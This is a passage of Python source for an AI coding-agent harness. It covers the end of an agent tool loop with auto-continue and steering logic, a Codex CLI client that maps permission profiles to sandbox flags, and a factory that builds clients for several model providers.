                              "problem — fixing before finishing.\n"))
                    api_messages.append({
                        "role": "user",
                        "content": (
                            "Auto-verification of the file(s) you just edited "
                            "found a problem. Fix it, then finish:\n\n"
                            f"{_problems}"),
                    })
                    continue        # force a fix round instead of ending

            # Mid-loop steering at turn end: the model gave a final answer (no
            # tool calls), but if the user steered while it ran, respond to that
            # instead of ending — record the answer, inject the user message,
            # and keep going. Also catches "agent stopped early" (e.g. after
            # creating a task list): a user "weiter" resumes in the same turn.
            _steer_end = self._drain_steer()
            if _steer_end:
                _final = "".join(_text_chunks) if _text_chunks else ""
                if _final.strip():
                    api_messages.append({"role": "assistant", "content": _final})
                for _s in _steer_end:
                    api_messages.append({"role": "user", "content": _s})
                    yield StreamEvent(
                        type="text_delta", text="\n\n💬 [you, mid-run]: " + _s + "\n")
                continue

            # Auto-continue: the model ended its turn, but tasks are still open
            # and it made fresh progress this round (o3 stops after each batch +
            # an "I'll continue" line). Keep the SAME turn going. Guarded: needs
            # tool activity since the last auto-continue + a hard cap, so it can
            # never loop without progress. The injected nudge also tells it to
            # ASK when genuinely unsure rather than guess — autonomy ≠ guessing.
            if (_did_tools_since_cont and _auto_cont_count < _AUTO_CONT_CAP
                    and self._has_pending_tasks()):
                _auto_cont_count += 1
                _did_tools_since_cont = False
                _final = "".join(_text_chunks) if _text_chunks else ""
                if _final.strip():
                    api_messages.append({"role": "assistant", "content": _final})
                api_messages.append({"role": "user", "content": (
                    "Continue — there are still OPEN tasks. Do the next task's "
                    "first concrete action NOW (write_file / bash …), update task "
                    "status as you go, and keep working straight through until "
                    "every task is completed. Do NOT stop to announce that you "
                    "will continue. BUT if you are genuinely UNSURE what the user "
                    "wants, or an action is risky/irreversible and you can't tell "
                    "it's intended, STOP and ask (ask_user_question) instead of "
                    "guessing — a wrong autonomous action is worse than a quick "
                    "question.")})
                yield StreamEvent(
                    type="text_delta", text="\n\n↻ auto-continue → next task\n")
                continue

            # No tool calls — emit final message_delta and break
            cost = self._estimate_cost(_total_in, _total_out)
            yield StreamEvent(
                type="message_delta",
                input_tokens=_total_in,
                output_tokens=_total_out,
                cost_usd=cost,
                cached_tokens=_total_cached,
                stop_reason=finish_reason or "end_turn",
            )
            break
        else:
            # Exhausted all tool rounds without a final text response.
            # Surface a visible chat notice so the user knows WHY the
            # stream stopped — silent stops at the budget edge made the
            # PNG2SMILES task look like the agent had quit (it just hit
            # the round cap mid-pip-install). The user can resume with
            # any message; the next turn picks up the conversation.
            yield StreamEvent(
                type="text_delta",
                text=(
                    f"\n\n⚠ Tool-round budget reached "
                    f"({_MAX_TOOL_ROUNDS} rounds this turn). "
                    f"The task isn't necessarily done — send any "
                    f"message (e.g. 'continue') to let me pick up where "
                    f"I left off.\n"
                ),
            )
            cost = self._estimate_cost(_total_in, _total_out)
            yield StreamEvent(
                type="message_delta",
                input_tokens=_total_in,
                output_tokens=_total_out,
                cost_usd=cost,
                cached_tokens=_total_cached,
                stop_reason="max_tool_rounds",
            )


# ---------------------------------------------------------------------------
# Codex CLI backend (uses OpenAI Codex CLI binary)
# ---------------------------------------------------------------------------

class CodexCLIClient(_BaseClient):
    """Use the OpenAI Codex CLI (``codex exec``) for agent tasks.

    Spawns ``codex exec --json --ephemeral`` per turn and streams JSONL
    events from stdout.  Sandbox/approval flags are derived from the
    DELFIN permission profile via *permission_mode*.

    Parameters
    ----------
    model : str
        Model name (``"gpt-5.4"``, ``"gpt-5.3-codex"``, etc.).
    codex_path : str
        Path to the ``codex`` binary.  Auto-detected if empty.
    cwd : str
        Working directory for the Codex process.
    permission_mode : str
        DELFIN permission profile mapped to Codex sandbox flags:
        ``"plan"`` → ``--sandbox read-only``
        ``"default"`` → ``--sandbox workspace-write``
        ``"acceptEdits"`` → ``--full-auto`` (workspace-write + auto)
        ``"auto"`` → ``--full-auto --sandbox danger-full-access``
    """

    DEFAULT_MODEL = "gpt-5.4"

    # Reuse OpenAI pricing table.
    _PRICING = OpenAIClient._PRICING

    # Map Claude CLI permission names → Codex CLI flags
    _PERM_TO_CODEX_FLAGS: dict[str, list[str]] = {
        "plan":                ["--sandbox", "read-only"],
        "default":             ["--sandbox", "workspace-write"],
        # repo_free: full disk access (git needs .git/ writable).
        # codex exec has no --ask-for-approval, so --full-auto is needed.
        # Safety relies on the DELFIN zone system + agent prompt rules.
        "acceptEdits":         ["--full-auto", "--sandbox", "danger-full-access"],
        "auto":                ["--full-auto", "--sandbox", "danger-full-access"],
        "bypassPermissions":   ["--full-auto", "--sandbox", "danger-full-access"],
    }

    def __init__(self, model: str = "", codex_path: str = "",
                 cwd: str = "", permission_mode: str = ""):
        self.model = model or self.DEFAULT_MODEL
        self.cwd = cwd or None
        self.permission_mode = permission_mode or "acceptEdits"
        self.codex_path = codex_path or shutil.which("codex") or "codex"
        if not shutil.which(self.codex_path):
            raise FileNotFoundError(
                f"Codex CLI not found at '{self.codex_path}'. "
                "Install with: npm install -g @openai/codex"
            )
        self._thread_id: str = ""

    def _estimate_cost(self, input_tokens: int, output_tokens: int) -> float:
        pricing = self._PRICING.get(self.model)
        if not pricing:
            pricing = (2.0, 8.0)
        return (input_tokens * pricing[0] + output_tokens * pricing[1]) / 1_000_000

    def stream_message(
        self,
        system: str,
        messages: list[dict[str, Any]],
        max_tokens: int = 8192,
        session_id: str = "",
        thinking_budget: int = 0,
    ) -> Generator[StreamEvent, None, None]:
        """Run ``codex exec --json`` and stream JSONL events.

        Each call spawns a fresh process (Codex CLI is per-turn).
        The system prompt and conversation are combined into a single
        prompt string since Codex exec is non-interactive.
        """
        # Build prompt from system + messages
        parts: list[str] = []
        if system:
            parts.append(f"[System instructions]\n{system}\n")
        for msg in messages:
            role = msg["role"]
            content = msg["content"]
            if role == "user":
                parts.append(f"[User]\n{content}\n")
            elif role == "assistant":
                parts.append(f"[Assistant]\n{content}\n")
        prompt_text = "\n".join(parts)

        cmd = [
            self.codex_path, "exec",
            "--json",
            "--ephemeral",
            "-m", self.model,
        ]
        # Add sandbox/approval flags based on permission profile
        codex_flags = self._PERM_TO_CODEX_FLAGS.get(
            self.permission_mode, ["--full-auto"]
        )
        cmd.extend(codex_flags)
        if self.cwd:
            cmd.extend(["-C", self.cwd])

        proc = subprocess.Popen(
            cmd,
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )

        # Send prompt via stdin
        try:
            proc.stdin.write(prompt_text)
            proc.stdin.close()
        except (BrokenPipeError, OSError):
            pass

        # Read JSONL events from stdout
        for line in proc.stdout:
            line = line.strip()
            if not line:
                continue
            try:
                data = json.loads(line)
            except json.JSONDecodeError:
                continue

            dtype = data.get("type", "")

            if dtype == "thread.started":
                tid = data.get("thread_id", "")
                if tid:
                    self._thread_id = tid
                    yield StreamEvent(type="session_init", text=tid)

            elif dtype == "item.completed":
                item = data.get("item", {})
                text = item.get("text", "")
                if text:
                    yield StreamEvent(type="text_delta", text=text)

            elif dtype == "turn.completed":
                usage = data.get("usage", {})
                inp = usage.get("input_tokens", 0)
                cached = usage.get("cached_input_tokens", 0)
                out = usage.get("output_tokens", 0)
                total_in = inp + cached
                cost = self._estimate_cost(total_in, out)
                yield StreamEvent(
                    type="message_delta",
                    input_tokens=total_in,
                    output_tokens=out,
                    cost_usd=cost,
                    stop_reason="end_turn",
                )

            elif dtype == "error":
                err_msg = data.get("message", "Unknown Codex error")
                yield StreamEvent(type="text_delta", text=f"\n[Codex error: {err_msg}]")

            elif dtype == "turn.failed":
                err = data.get("error", {})
                err_msg = err.get("message", "Turn failed")
                yield StreamEvent(type="text_delta", text=f"\n[Codex error: {err_msg}]")
                yield StreamEvent(
                    type="message_delta",
                    stop_reason="error",
                )

        rc = proc.wait()
        # Surface errors that Codex CLI wrote to stderr
        if rc != 0:
            stderr_text = ""
            try:
                stderr_text = (proc.stderr.read() or "").strip()
            except Exception:
                pass
            if stderr_text:
                yield StreamEvent(
                    type="text_delta",
                    text=f"\n[Codex CLI error (exit {rc})]: {stderr_text[:500]}",
                )
                yield StreamEvent(type="message_delta", stop_reason="error")

    def switch_model(self, model: str) -> None:
        """Switch model for next invocation."""
        if model and model != self.model:
            self.model = model

    def kill(self) -> None:
        """No persistent process to kill."""

    @property
    def session_id(self) -> str:
        """Return the last thread ID."""
        return self._thread_id


# ---------------------------------------------------------------------------
# Factory
# ---------------------------------------------------------------------------

def _map_kit_permission_mode(permission_mode: str) -> str:
    """Map dashboard CLI-permission strings to KitToolPermissions modes.

    Cap at 'acceptEdits' for unknown values — destructive ops should never
    silently pass through to bypassPermissions. Bash is still gated by
    deny-list + auto-allow + callback regardless of mode.
    """
    pm = (permission_mode or "").strip()
    table = {
        "":                  "default",
        "default":           "default",
        "ask_all":           "default",
        "plan":              "plan",
        "acceptEdits":       "acceptEdits",
        "auto":              "acceptEdits",
        "repo_free":         "acceptEdits",
        "bypassPermissions": "bypassPermissions",
        "all_free":          "bypassPermissions",
    }
    return table.get(pm, "default")


def create_client(
    backend: str = "cli",
    provider: str = "claude",
    api_key: str = "",
    model: str = "",
    claude_path: str = "",
    permission_mode: str = "",
    cwd: str = "",
    mcp_config: str = "",
    allowed_tools: list[str] | None = None,
    extra_dirs: list[str] | None = None,
    read_only_dirs: list[str] | None = None,
    confirm_write_dirs: list[str] | None = None,
    effort: str = "",
    kit_confirm_callback: Optional[Callable[[str, dict, str], bool]] = None,
) -> _BaseClient:
    """Create the appropriate client backend.

    Parameters
    ----------
    backend : str
        ``"cli"`` (default) or ``"api"``.
    provider : str
        ``"claude"`` (default) or ``"openai"``.
    api_key : str
        Only needed for API backends.
    model : str
        Model name/alias.
    claude_path : str
        Only for ``"cli"`` backend.
    permission_mode : str
        CLI permission mode (``"default"``, ``"acceptEdits"``, ``"plan"``,
        ``"auto"``, ``"bypassPermissions"``).
    cwd : str
        Working directory for the CLI process.
    allowed_tools : list[str], optional
        Restrict the CLI to these tools only (``--allowedTools``).
    extra_dirs : list[str], optional
        Extra writable directories for the CLI (``--add-dir``).
    """
    if provider == "kit":
        from .credentials import load_credential as _load_cred
        kit_key = api_key or _load_cred("KIT_TOOLBOX_API_KEY")
        kit_workspace = Path(cwd).expanduser().resolve() if cwd else Path.cwd().resolve()

        # Pull persisted user/repo settings (.delfin-style two-tier
        # ~/.delfin/settings.json + <repo>/.delfin/settings.json). Defaults
        # are empty if neither file exists.
        try:
            from . import kit_settings as _kit_settings  # local import to avoid cycle
            persisted = _kit_settings.load(repo_dir=kit_workspace)
        except Exception:
            persisted = None

        seen: list[Path] = []
        # Caller-supplied extra_dirs first (e.g. CLI args), then persisted ones.
        sources: list[str] = []
        if extra_dirs:
            sources.extend(extra_dirs)
        if persisted is not None:
            sources.extend(persisted.extra_workspace_dirs)
        for d in sources:
            try:
                p = Path(d).expanduser().resolve()
            except Exception:
                continue
            if p == kit_workspace or p in seen:
                continue
            if not p.exists() or not p.is_dir():
                continue
            seen.append(p)
        kit_extra = tuple(seen)

        # Mode: explicit caller arg wins over persisted default_mode.
        if permission_mode:
            kit_mode = _map_kit_permission_mode(permission_mode)
        elif persisted is not None and persisted.default_mode in {
            "plan", "default", "acceptEdits", "bypassPermissions"
        }:
            kit_mode = persisted.default_mode
        else:
            kit_mode = "default"

        # Allow/deny patterns: append persisted ones to the built-in defaults.
        allow_patterns = tuple(_DEFAULT_BASH_AUTO_ALLOW)
        deny_patterns = tuple(_DEFAULT_BASH_DENY_PATTERNS)
        if persisted is not None:
            extra_allow = tuple(p for p in persisted.allow_patterns
                                if p not in allow_patterns)
            extra_deny = tuple(p for p in persisted.deny_patterns
                               if p not in deny_patterns)
            allow_patterns = allow_patterns + extra_allow
            deny_patterns = deny_patterns + extra_deny

        kit_perms = KitToolPermissions(
            workspace=kit_workspace,
            mode=kit_mode,
            confirm_callback=kit_confirm_callback,
            extra_workspace_dirs=kit_extra,
            read_only_workspace_dirs=tuple(read_only_dirs or ()),
            confirm_write_dirs=tuple(confirm_write_dirs or ()),
            bash_auto_allow_patterns=allow_patterns,
            bash_deny_patterns=deny_patterns,
        )
        return OpenAIClient(
            api_key=kit_key, model=model,
            base_url="https://ki-toolbox.scc.kit.edu/api/v1",
            key_env_var="KIT_TOOLBOX_API_KEY",
            permissions=kit_perms,
            provider="kit",
        )
    if provider == "openai":
        if backend == "cli":
            return CodexCLIClient(model=model, cwd=cwd,
                                  permission_mode=permission_mode)
        from .credentials import load_credential as _load_cred_openai
        openai_key = api_key or _load_cred_openai("OPENAI_API_KEY")
        return OpenAIClient(api_key=openai_key, model=model, provider="openai")
    if provider == "ollama":
        # Ollama, vLLM, LM Studio, llama.cpp-server etc. expose an
        # OpenAI-compatible /v1 surface. They reuse the same agentic
        # while-loop + KIT-style sandbox / hooks / failure-log machinery
        # as the KIT-Toolbox provider — only the base_url and (no) api
        # key differ. Endpoint resolution order:
        #   1. caller-supplied api_key  (treated as "host" if it starts with http)
        #   2. OLLAMA_HOST env var      (canonical Ollama convention)
        #   3. OLLAMA_BASE_URL env var  (LM-Studio convention)
        #   4. default http://localhost:11434
        ollama_host = (
            api_key if api_key and api_key.startswith("http")
            else (
                os.environ.get("OLLAMA_HOST")
                or os.environ.get("OLLAMA_BASE_URL")
                or "http://localhost:11434"
            )
        )
        if not ollama_host.rstrip("/").endswith("/v1"):
            ollama_host = ollama_host.rstrip("/") + "/v1"
        # Reuse the KIT permissions stack so local-model runs get the
        # same sandbox + allow-list as the cloud-providers do.
        local_ws = Path(cwd).expanduser().resolve() if cwd else Path.cwd().resolve()
        try:
            from . import kit_settings as _kit_settings
            persisted = _kit_settings.load(repo_dir=local_ws)
        except Exception:
            persisted = None
        local_extra: tuple[Path, ...] = ()
        if persisted is not None:
            seen: list[Path] = []
            for d in persisted.extra_workspace_dirs:
                try:
                    p = Path(d).expanduser().resolve()
                except Exception:
                    continue
                if p == local_ws or p in seen or not p.is_dir():
                    continue
                seen.append(p)
            local_extra = tuple(seen)
        local_mode = (
            _map_kit_permission_mode(permission_mode) if permission_mode
            else (persisted.default_mode if persisted is not None
                  and persisted.default_mode in {
                      "plan", "default", "acceptEdits", "bypassPermissions"
                  } else "default")
        )
        local_perms = KitToolPermissions(
            workspace=local_ws, mode=local_mode,
            confirm_callback=kit_confirm_callback,
            extra_workspace_dirs=local_extra,
            read_only_workspace_dirs=tuple(read_only_dirs or ()),
            confirm_write_dirs=tuple(confirm_write_dirs or ()),
            bash_auto_allow_patterns=tuple(_DEFAULT_BASH_AUTO_ALLOW),
            bash_deny_patterns=tuple(_DEFAULT_BASH_DENY_PATTERNS),
        )
        # Ollama's OpenAI surface requires no auth — pass a placeholder so
        # the openai-python client doesn't blow up on missing-key.
        return OpenAIClient(
            api_key="ollama-local",
            model=model,
            base_url=ollama_host,
            key_env_var="OLLAMA_HOST",
            permissions=local_perms,
            provider="ollama",
        )
    if backend == "api":
        return APIClient(api_key=api_key, model=model)
    return CLIClient(model=model, claude_path=claude_path,
                     permission_mode=permission_mode, cwd=cwd,
                     mcp_config=mcp_config,
                     allowed_tools=allowed_tools,
                     extra_dirs=extra_dirs,
                     effort=effort)
